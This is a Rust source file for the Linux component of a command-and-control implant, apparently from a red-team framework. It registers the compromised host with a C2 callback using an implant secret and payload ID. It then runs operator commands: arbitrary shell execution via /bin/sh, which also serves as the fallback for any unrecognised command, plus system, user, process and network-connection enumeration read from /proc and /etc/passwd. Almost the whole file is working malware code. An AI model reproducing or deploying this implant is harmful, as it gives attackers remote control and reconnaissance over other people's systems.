use std::env;
use std::process::Command;

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    // Try /etc/hostname first, then /proc/sys/kernel/hostname, then "unknown"
    std::fs::read_to_string("/etc/hostname")
        .or_else(|_| std::fs::read_to_string("/proc/sys/kernel/hostname"))
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    link_common::run_c2_loop(
        crate::CALLBACK,
        crate::IMPLANT_SECRET,
        crate::PAYLOAD_UUID,
        crate::CALLBACK_URI,
        link_common::RegisterInfo {
            user: username(),
            host: hostname(),
            ip: local_ip(),
            os: "linux",
            arch: std::env::consts::ARCH,
            pid: std::process::id(),
            integrity_level: 2,
        },
        dispatch,
    );
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(command: &str, parameters: &str) -> String {
    if let Some(output) = link_common::dispatch::dispatch_common(command, parameters) {
        return output;
    }
    match command {
        "whoami" => format!("{}@{}", username(), hostname()),
        "info" => collect_system_info(),
        "ps" => list_processes(),
        "netstat" => list_network_connections(),
        "shell" => {
            let cmd = link_common::extract_param(parameters, "command");
            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
        }
        _ => {
            let cmd = link_common::extract_param(parameters, "command");
            let fallback = format!("{} {}", command, parameters);
            shell_exec(if cmd.is_empty() { &fallback } else { &cmd })
        }
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

// ── System information ────────────────────────────────────────────────────────

fn collect_system_info() -> String {
    use std::fs;

    let mut info = Vec::new();

    if let Ok(os_release) = fs::read_to_string("/etc/os-release") {
        if let Some(name) = os_release.lines().find(|l| l.starts_with("PRETTY_NAME=")) {
            if let Some(value) = name.split('=').nth(1) {
                info.push(format!("OS Version: {}", value.trim_matches('"')));
            }
        }
    }

    info.push(format!("Architecture: {}", std::env::consts::ARCH));
    info.push(format!("User: {}@{}", username(), hostname()));

    let mut interfaces = Vec::new();
    if let Ok(entries) = fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let iface_name = entry.file_name().to_string_lossy().into_owned();
            if iface_name != "lo" {
                if let Some(addr) = get_interface_ip(&iface_name) {
                    interfaces.push(format!("{}: {}", iface_name, addr));
                }
            }
        }
    }
    if !interfaces.is_empty() {
        info.push(format!("Network: {}", interfaces.join(", ")));
    }

    if let Ok(mem_info) = fs::read_to_string("/proc/meminfo") {
        if let Some(mem_total) = mem_info.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(value) = mem_total.split_whitespace().nth(1) {
                info.push(format!("RAM: {} KB", value));
            }
        }
    }

    if let Ok(cpu_info) = fs::read_to_string("/proc/cpuinfo") {
        let cpu_count = cpu_info
            .lines()
            .filter(|l| l.starts_with("processor"))
            .count();
        if cpu_count > 0 {
            info.push(format!("CPU Cores: {}", cpu_count));
        }
        if let Some(model_line) = cpu_info.lines().find(|l| l.starts_with("model name")) {
            if let Some(model) = model_line.split(':').nth(1) {
                info.push(format!("CPU Model: {}", model.trim()));
            }
        }
    }

    if let Ok(uptime) = fs::read_to_string("/proc/uptime") {
        if let Some(seconds) = uptime.split_whitespace().next() {
            if let Ok(uptime_secs) = seconds.parse::<f64>() {
                let hours = (uptime_secs / 3600.0).floor();
                let minutes = ((uptime_secs % 3600.0) / 60.0).floor();
                info.push(format!("Uptime: {:.0}h {:.0}m", hours, minutes));
            }
        }
    }

    info.push(format!("Process ID: {}", std::process::id()));

    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}

fn get_interface_ip(interface: &str) -> Option<String> {
    let operstate =
        std::fs::read_to_string(format!("/sys/class/net/{}/operstate", interface)).ok()?;
    if operstate.trim() != "up" {
        return None;
    }

    let output = Command::new("ip")
        .args(["addr", "show", interface])
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        if let Some(rest) = line.trim().strip_prefix("inet ") {
            return rest.split('/').next().map(|s| s.to_string());
        }
    }
    None
}

fn list_processes() -> String {
    use std::fs;
    use std::path::Path;

    let mut processes = Vec::new();
    processes.push("PID\tPPID\tUSER\t\tCOMMAND".to_string());
    processes.push("-".repeat(50));

    if let Ok(entries) = fs::read_dir("/proc") {
        for entry in entries.flatten() {
            if let Ok(pid_str) = entry.file_name().into_string() {
                if let Ok(_pid) = pid_str.parse::<u32>() {
                    let proc_path = Path::new("/proc").join(&pid_str);
                    let status_path = proc_path.join("status");
                    if let Ok(status) = fs::read_to_string(status_path) {
                        let mut process_pid = 0u32;
                        let mut process_ppid = 0u32;
                        let mut process_uid = 0u32;
                        let mut process_name = "unknown".to_string();

                        for line in status.lines() {
                            if line.starts_with("Name:") {
                                if let Some(name) = line.split(':').nth(1) {
                                    process_name = name.trim().to_string();
                                }
                            } else if line.starts_with("Pid:") {
                                if let Ok(p) = line.split(':').nth(1).unwrap_or("").trim().parse() {
                                    process_pid = p;
                                }
                            } else if line.starts_with("PPid:") {
                                if let Ok(pp) = line.split(':').nth(1).unwrap_or("").trim().parse()
                                {
                                    process_ppid = pp;
                                }
                            } else if line.starts_with("Uid:") {
                                if let Some(u) = line
                                    .split(':')
                                    .nth(1)
                                    .and_then(|s| s.split_whitespace().next())
                                    .and_then(|s| s.parse().ok())
                                {
                                    process_uid = u;
                                }
                            }
                        }

                        let uname = get_username_from_uid(process_uid);
                        processes.push(format!(
                            "{}\t{}\t{}\t{}",
                            process_pid, process_ppid, uname, process_name
                        ));
                    }
                }
            }
        }
    }

    if processes.len() <= 2 {
        "No processes found or insufficient permissions".to_string()
    } else {
        processes.join("\n")
    }
}

fn get_username_from_uid(uid: u32) -> String {
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 {
                if let Ok(line_uid) = parts[2].parse::<u32>() {
                    if line_uid == uid {
                        return parts[0].to_string();
                    }
                }
            }
        }
    }
    uid.to_string()
}

fn list_network_connections() -> String {
    let mut connections = Vec::new();
    connections.push("Proto\tLocal Address\t\tRemote Address\t\tState\tPID/Program".to_string());
    connections.push("-".repeat(80));

    for (proto, path) in [
        ("TCP", "/proc/net/tcp"),
        ("TCP6", "/proc/net/tcp6"),
        ("UDP", "/proc/net/udp"),
        ("UDP6", "/proc/net/udp6"),
    ] {
        if let Ok(content) = std::fs::read_to_string(path) {
            parse_net_connections(&content, proto, &mut connections);
        }
    }

    if connections.len() <= 2 {
        "No network connections found or insufficient permissions".to_string()
    } else {
        connections.join("\n")
    }
}

fn parse_net_connections(content: &str, proto: &str, connections: &mut Vec<String>) {
    for line in content.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 10 {
            continue;
        }
        let (local_ip_hex, local_port_hex) = match parts[1].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let (remote_ip_hex, remote_port_hex) = match parts[2].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let state = parts[3];
        let inode = parts[9];

        let local_ip = hex_to_ip(local_ip_hex);
        let local_port = hex_to_port(local_port_hex);
        let remote_ip = hex_to_ip(remote_ip_hex);
        let remote_port = hex_to_port(remote_port_hex);
        let process_info = get_process_from_inode(inode);

        connections.push(format!(
            "{}\t{}:{}\t\t{}:{}\t\t{}\t{}",
            proto, local_ip, local_port, remote_ip, remote_port, state, process_info
        ));
    }
}

fn hex_to_ip(hex_str: &str) -> String {
    match hex_str.len() {
        8 => (0..4)
            .rev()
            .map(|i| {
                u8::from_str_radix(&hex_str[i * 2..i * 2 + 2], 16)
                    .map(|b| b.to_string())
                    .unwrap_or_else(|_| "?".to_string())
            })
            .collect::<Vec<_>>()
            .join("."),
        32 => {
            let mut groups = Vec::with_capacity(8);
            for i in 0..4 {
                let chunk = &hex_str[i * 8..(i + 1) * 8];
                let word = u32::from_str_radix(chunk, 16).unwrap_or(0).swap_bytes();
                groups.push(format!("{:04x}", (word >> 16) as u16));
                groups.push(format!("{:04x}", word as u16));
            }
            groups.join(":")
        }
        _ => hex_str.to_string(),
    }
}

fn hex_to_port(hex_str: &str) -> String {
    u16::from_str_radix(hex_str, 16)
        .map(|p| p.to_string())
        .unwrap_or_else(|_| hex_str.to_string())
}

fn get_process_from_inode(inode: &str) -> String {
    if let Ok(proc_entries) = std::fs::read_dir("/proc") {
        for proc_entry in proc_entries.flatten() {
            if let Ok(pid_str) = proc_entry.file_name().into_string() {
                if pid_str.parse::<u32>().is_ok() {
                    let fd_path = format!("/proc/{}/fd", pid_str);
                    if let Ok(fd_entries) = std::fs::read_dir(&fd_path) {
                        for fd_entry in fd_entries.flatten() {
                            if let Ok(link_target) = std::fs::read_link(fd_entry.path()) {
                                if link_target
                                    .to_str()
                                    .is_some_and(|s| s.contains(&format!("socket:[{}]", inode)))
                                {
                                    let status_path = format!("/proc/{}/status", pid_str);
                                    if let Ok(status) = std::fs::read_to_string(&status_path) {
                                        for line in status.lines() {
                                            if line.starts_with("Name:") {
                                                if let Some(name) = line.split(':').nth(1) {
                                                    return format!("{}[{}]", pid_str, name.trim());
                                                }
                                            }
                                        }
                                    }
                                    return format!("{}[unknown]", pid_str);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    "-".to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hex_to_ip_v4() {
        assert_eq!(hex_to_ip("0100007F"), "127.0.0.1");
    }

    #[test]
    fn test_hex_to_ip_v4_unknown_host() {
        assert_eq!(hex_to_ip("00000000"), "0.0.0.0");
    }

    #[test]
    fn test_hex_to_ip_v6_loopback() {
        let result = hex_to_ip("00000000000000000000000001000000");
        assert!(result.contains(':'), "should be IPv6 notation: {}", result);
    }

    #[test]
    fn test_hex_to_ip_unknown_length_returns_raw() {
        assert_eq!(hex_to_ip("ABCD"), "ABCD");
    }
}
